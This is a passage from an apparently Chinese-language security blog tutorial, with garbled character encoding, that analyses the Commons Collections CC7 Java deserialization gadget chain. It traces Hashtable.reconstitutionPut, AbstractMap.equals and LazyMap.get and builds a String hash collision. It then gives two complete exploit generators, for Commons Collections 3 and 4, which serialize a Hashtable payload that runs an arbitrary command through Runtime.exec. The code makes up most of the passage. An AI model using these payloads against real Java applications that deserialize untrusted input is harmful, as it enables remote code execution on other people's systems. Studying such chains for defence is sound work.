class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Hashtable è¯­ä¹‰ï¼šä¸å…è®¸ null å€¼ï¼›è‹¥è¯»åˆ° nullï¼Œè®¤ä¸ºåºåˆ—åŒ–æµè¢«ç¯¡æ”¹æˆ–æŸå</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®— key çš„å“ˆå¸Œï¼Œå¹¶è§„æ•´ä¸ºéè´Ÿæ•°</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¡®è®¤è¯¥ bucket é“¾è¡¨ä¸­æ²¡æœ‰é‡å¤ key</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        <span class="comment">// å…ˆæ¯”é¢„å­˜çš„ hashï¼Œå†æ¯” equalsï¼Œé¿å…é‡å¤é”®</span></span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; <span class="comment">// âœ… è°ƒç”¨ e.key.equals</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤´æ’æ³•åˆ›å»ºå¹¶æŒ‚æ¥æ–°ç»“ç‚¹</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;) tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ›´æ–°å…ƒç´ è®¡æ•°</span></span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯¹äº <code>HashMap</code> å’Œ <code>LazyMap</code> æœ‰å¦‚ä¸‹ç»§æ‰¿å…³ç³»ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/image-20241108030406773.png"
                      alt="image-20241108030406773"
                ><br>å¯ä»¥çœ‹åˆ°ï¼Œ<code>HashMap</code> ç»§æ‰¿äº <code>AbstraceMap</code>ï¼Œ<code>LazyMap</code> ç»§æ‰¿äº <code>AbstractMapDecorator</code>ã€‚</p>
<p>å› æ­¤å¦‚æœ <code>HashTable</code> ä¸­çš„ <code>key</code> éƒ½æ˜¯ <code>LazyMap</code> ä¿®é¥°çš„ <code>HashMap</code> é‚£ä¹ˆ <code>e.key.equals</code> è°ƒç”¨çš„æ˜¯ <code>LazyMap#equals â†’ AbstractMapDecorator#equals</code>ã€‚</p>
<p>ç„¶å <code>AbstractMapDecorator#equals</code> è°ƒç”¨çš„æ˜¯ <code>HashMap#equals â†’ AbstractMap#equals</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.equals(object); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ HashMap#equals â†’ AbstractMap#equals</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>AbstractMap#equals</code> ä¼šå°†ä¼ å…¥å‚ä¸æ¯”è¾ƒçš„ <code>LazyMap</code> ä¸è‡ªèº«è¿›è¡Œæ¯”è¾ƒã€‚æ¯”è¾ƒè¿‡ç¨‹ä¸­ä¸ºäº†åˆ¤æ–­åŒ…å«çš„é”®å€¼å¯¹æ˜¯å¦ç›¸åŒï¼Œä¼šè°ƒç”¨ <code>LazyMap</code> å‚æ•°çš„ <code>LazyMap#get</code> è¿›è€Œè§¦å‘ <code>transform</code> æ–¹æ³•è°ƒç”¨ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>) <span class="comment">// ç¡®ä¿ä¸æ˜¯åŒä¸€ä¸ª LazyMap å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ğŸ“Œ å°†å‚ä¸æ¯”è¾ƒçš„ o è½¬æ¢ä¸º Map ç±»å‹çš„ m</span></span><br><span class="line">    <span class="comment">// è¿™é‡Œçš„ m æ˜¯å¦ä¸€ä¸ª LazyMap</span></span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key))) <span class="comment">// âœ… è°ƒç”¨ LazyMap#get</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ ¹æ®å‰é¢çš„åˆ†æå¯çŸ¥æˆ‘ä»¬å¯ä»¥åœ¨ <code>Hashtable</code> æ”¾ä¸¤ä¸ªé”®å€¼å¯¹æ»¡è¶³ä¸¤ä¸ªé”®å“ˆå¸Œå€¼ç›¸åŒä½†ä¸æ˜¯åŒä¸€ä¸ªçš„ <code>LazyMap</code> å¯¹åƒã€‚è€Œ <code>LazyMap</code> çš„å“ˆå¸Œå€¼å®é™…ä¸Šå°±æ˜¯ <code>Map</code> ä¸­æ‰€æœ‰ã€Œé”®å’Œå€¼çš„å“ˆå¸Œçš„å¼‚æˆ–å€¼ã€ä¹‹å’Œã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> o != <span class="literal">null</span> ? o.hashCode() : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HashMap$Node (Map.Entry)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AbstraceMap</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">        h += i.next().hashCode();</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AbstractMapDecorator</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key.hashCode();</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬ä¸å¦¨è®©é”®å€¼å¯¹ä¸­çš„å€¼ç›¸ç­‰ï¼Œé‚£ä¹ˆå°±åªéœ€è¦è€ƒè™‘æ‰¾å“ˆå¸Œç›¸ç­‰ä¸”å€¼ä¸åŒçš„é”®ã€‚</p>
<p>æˆ‘ä»¬é€‰æ‹© <code>java.lang.String</code> ç±»å‹çš„é”®ï¼Œè¿™ä¸ªç±»å‹çš„ <code>hashCode</code> å®ç°å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å¾ˆå®¹æ˜“å°±æƒ³åˆ°å¯ä»¥æ„é€ é•¿åº¦ä¸º 2 çš„å­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡å‰ä¸€ä¸ªå­—ç¬¦çš„ ascii ç åŠ  1 ç„¶ååä¸€ä¸ªå­—ç¬¦çš„ ascii ç å‡ 31 æŠµæ¶ˆå‰ä¸€ä¸ªå­—ç¬¦çš„å½±å“æ¥å¾—åˆ°ä¸¤ä¸ªå“ˆå¸Œç›¸åŒçš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ <code>Aa</code>â†’<code>[65,97]</code>â†’<code>[65+1,97-31]</code>â†’<code>[66,66]</code>â†’<code>BB</code>ï¼‰ã€‚</p>
<h4 id="åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-4"><a href="#åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-4" class="headerlink" title="åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰"></a>åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        outerMap1.put(<span class="string">&quot;Aa&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        outerMap2.put(<span class="string">&quot;BB&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(outerMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(outerMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        outerMap2.remove(<span class="string">&quot;Aa&quot;</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap1</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap1, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap2</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap2, transformerChain);</span><br><span class="line">        outerMap1.put(<span class="string">&quot;Aa&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        outerMap2.put(<span class="string">&quot;BB&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(outerMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(outerMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        outerMap2.remove(<span class="string">&quot;Aa&quot;</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        